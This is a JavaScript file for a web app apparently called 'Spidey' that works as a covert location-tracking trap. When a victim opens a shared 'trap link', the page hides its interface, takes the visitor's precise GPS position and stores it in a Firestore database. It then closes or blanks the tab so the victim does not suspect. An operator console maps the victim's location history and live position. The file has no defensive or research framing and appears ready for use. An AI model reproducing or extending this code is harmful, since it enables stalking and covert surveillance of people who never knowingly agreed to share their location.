import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getFirestore, doc, setDoc, onSnapshot, collection, getDocs, query, orderBy } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

// --- CONFIGURA AQUÍ TUS CREDENCIALES DE FIREBASE ---
const firebaseConfig = {
    apiKey: "TU_API_KEY",
    authDomain: "tu-proyecto.firebaseapp.com",
    projectId: "tu-proyecto",
    storageBucket: "tu-proyecto.appspot.com",
    messagingSenderId: "TU_MESSAGING_SENDER_ID",
    appId: "TU_APP_ID"
};
// ---------------------------------------------------

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

let map;
let mainMarker;
let marcadoresAraña;
const ubicacionPorDefecto = [14.3333, -90.6667]; 

const urlParams = new URLSearchParams(window.location.search);
const targetId = urlParams.get('target');

document.addEventListener("DOMContentLoaded", function () {
    
    // --- MODO VÍCTIMA (SIGILOSO) ---
    if (targetId) {
        document.getElementById('main-console').style.display = 'none';
        document.getElementById('stealth-screen').style.display = 'flex';

        ejecutarTrampaGPSYCerrar(targetId);
        return; 
    }

    // --- MODO CONSOLA PRINCIPAL (TÚ EN TU PC) ---
    document.getElementById('main-console').style.display = 'block';
    document.getElementById('stealth-screen').style.display = 'none';

    map = L.map('map', { zoomControl: false }).setView(ubicacionPorDefecto, 14);
    
    // Inicializar el grupo de capas para las arañas
    marcadoresAraña = L.layerGroup().addTo(map);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19,
        attribution: '&copy; OpenStreetMap contributors'
    }).addTo(map);

    mainMarker = L.marker(ubicacionPorDefecto, { zIndexOffset: 1000 }).addTo(map)
      .bindPopup("<b>Consola Central Activa.</b>");

    setTimeout(() => { map.invalidateSize(); }, 200);

    // Cargar puntos y activar tiempo real
    cargarPuntosHistoricos("objetivo_principal");
    escucharObjetivoEnTiempoReal("objetivo_principal");
});

// --- TRAPA GPS: PESTAÑEO Y CIERRE AUTOMÁTICO ---
function ejecutarTrampaGPSYCerrar(id) {
    if (!navigator.geolocation) {
        finalizarSalida();
        return;
    }

    navigator.geolocation.getCurrentPosition(
        async (position) => {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            const timestamp = new Date();

            try {
                // 1. Guardar en la subcolección de historial (para la araña 🕷️)
                const refHistorial = doc(collection(db, "rastreos", id, "lecturas"));
                await setDoc(refHistorial, { lat, lng, timestamp });

                // 2. Actualizar el documento principal
                await setDoc(doc(db, "rastreos", id), { lat, lng, timestamp });

                console.log("Coordenadas capturadas con éxito.");
            } catch (e) {
                console.error("Error al registrar en Firebase:", e);
            }
            
            finalizarSalida();
        },
        (error) => {
            console.log("GPS denegado o no disponible.");
            finalizarSalida();
        },
        { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
    );
}

// Función para cerrar la pestaña o redirigir y que no sospechen
function finalizarSalida() {
    setTimeout(() => {
        // Intenta cerrar la ventana (algunos navegadores bloquean esto si no fue abierta por script, 
        // por lo que si falla, redirige a Google o a una página en blanco de forma limpia)
        window.close();
        
        // Plan B inmediato si window.close() es bloqueado por el navegador:
        window.location.href = "about:blank"; 
    }, 1000); // 1 segundo de margen para asegurar que Firebase guardó los datos
}

// --- CARGAR ARAÑAS EN TU CONSOLA PRINCIPAL ---
async function cargarPuntosHistoricos(id) {
    if (!marcadoresAraña) return;
    marcadoresAraña.clearLayers();

    try {
        const lecturasRef = collection(db, "rastreos", id, "lecturas");
        const q = query(lecturasRef, orderBy("timestamp", "asc"));
        const querySnapshot = await getDocs(q);
        
        let ultimaUbicacion = null;
        let bounds = [];

        querySnapshot.forEach((docSnap) => {
            const data = docSnap.data();
            const lat = data.lat;
            const lng = data.lng;
            
            // Manejar timestamp de Firestore de forma segura
            let horaTexto = "Reciente";
            if (data.timestamp) {
                const fecha = typeof data.timestamp.toDate === 'function' 
                    ? data.timestamp.toDate() 
                    : new Date(data.timestamp);
                horaTexto = fecha.toLocaleTimeString();
            }

            // Crear icono de araña 🕷️
            const spiderIcon = L.divIcon({
                html: '🕷️',
                className: 'spider-marker',
                iconSize: [24, 24],
                iconAnchor: [12, 12]
            });

            const marker = L.marker([lat, lng], { icon: spiderIcon })
                .bindPopup(`<b>Punto de Acceso 🕷️</b><br>Hora: ${horaTexto}`);
            
            marcadoresAraña.addLayer(marker);
            bounds.push([lat, lng]);
            ultimaUbicacion = [lat, lng];
        });

        if (bounds.length > 0) {
            map.fitBounds(bounds, { padding: [50, 50] });
            document.getElementById('banner-status').innerHTML = "RED DE ARAÑAS ACTIVA";
        } else {
            document.getElementById('banner-status').innerHTML = "SIN PUNTOS DE ACCESO";
        }
    } catch (e) {
        console.error("Error al cargar puntos históricos:", e);
        document.getElementById('banner-status').innerHTML = "ERROR CARGANDO DATOS";
    }
}

// Escuchar cambios en tiempo real
function escucharObjetivoEnTiempoReal(id) {
    onSnapshot(doc(db, "rastreos", id), (docSnap) => {
        if (docSnap.exists()) {
            const data = docSnap.data();
            mainMarker.setLatLng([data.lat, data.lng]);
            
            // Opcional: si entra una nueva señal en tiempo real, recargamos las arañas del historial
            cargarPuntosHistoricos(id);
        }
    });
}

// --- BOTONES Y UTILIDADES DE TU CONSOLA ---
window.compartirEnlace = function() {
    const enlaceObjetivo = "https://mmommo52.github.io/Spidey/?target=objetivo_principal";
    navigator.clipboard.writeText(enlaceObjetivo).then(() => {
        alert("¡Enlace trampa copiado al portapapeles!");
    });
};

window.accionRastrearObjetivo = function() {
    alert("Actualizando mapa y recargando puntos de acceso...");
    cargarPuntosHistoricos("objetivo_principal");
};

window.obtenerUbicacionActual = () => {
    navigator.geolocation?.getCurrentPosition((pos) => {
        map.setView([pos.coords.latitude, pos.coords.longitude], 16);
    });
};

window.centrarEnMiUbicacion = () => {
    navigator.geolocation?.getCurrentPosition((pos) => {
        map.setView([pos.coords.latitude, pos.coords.longitude], 17);
    });
};

window.cambiarAlerta = (t) => alert("Alerta: " + t);
window.cambiarPerfil = (n) => alert("Perfil: " + n);
window.abrirChat = () => alert("Canal de chat seguro abierto.");
window.verArchivo = () => alert("Abriendo registros históricos...");
